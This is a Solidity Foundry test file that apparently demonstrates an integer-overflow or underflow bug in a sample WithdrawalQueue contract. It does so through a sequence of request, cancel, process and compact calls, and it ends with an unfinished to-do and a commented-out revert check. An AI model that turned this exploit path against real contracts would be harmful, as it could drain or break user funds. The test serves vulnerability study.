// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Base} from "test/Base.t.sol";
import {WithdrawalQueue} from "src/Integer Overflow/WithdrawalQueue.sol";

contract WithdrawalQueueTest is Base {
    WithdrawalQueue queue;
    address _manager = address(0x801);

    function setUp() external {
        vm.prank(_manager);
        queue = new WithdrawalQueue();
    }

    function testExploiPath() external {
        address lisa = address(0x807);

        for (uint8 a; a < 3; a++) {
            vm.prank(lisa);
            queue.requestWithdrawal(1e6);
        }
        assertEq(queue.processedCount(), 0);

        vm.prank(lisa);
        queue.cancelWithdrawal(2);
        assertEq(queue.processedCount(), 1);

        vm.warp(block.timestamp + 8 days);

        vm.prank(_manager);
        queue.processWithdrawals(10);

        vm.prank(_manager);
        queue.compact();
        assertEq(queue.processedCount(), 1);

        vm.prank(_manager);
        queue.processWithdrawals(10);

        // @to-do: will need to come back to this
        // vm.expectRevert();
        queue.getPendingCount();
    }
}
